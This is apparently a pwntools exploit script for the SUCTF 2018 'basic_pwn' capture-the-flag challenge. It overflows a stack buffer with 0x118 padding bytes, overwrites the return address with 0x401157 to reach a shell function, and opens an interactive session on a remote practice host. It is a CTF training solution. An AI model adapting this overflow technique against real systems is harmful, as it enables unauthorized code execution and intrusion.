from pwn import *
context(log_level = 'debug')
# io = process('./SUCTF_2018_basic_pwn')
io = remote('node4.buuoj.cn',25238)
elf = ELF('./SUCTF_2018_basic_pwn')

shell_addr = 0x401157
payload = b'a'*(0x110+8) + p64(shell_addr)

io.send(payload)
io.interactive()